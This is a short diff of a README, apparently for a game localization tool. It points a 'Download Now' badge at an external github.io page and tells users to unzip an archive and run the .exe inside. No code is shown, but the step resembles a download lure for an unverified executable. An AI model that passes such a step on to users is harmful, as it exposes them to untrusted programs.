@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://splitfiction-language-localization.github.io/.github/)
 
 ## 📸 Overview
 ![splitfiction-localization-menus](https://github.com/user-attachments/assets/5ca0c7ce-7ae3-4746-8755-bb6807d9d714)
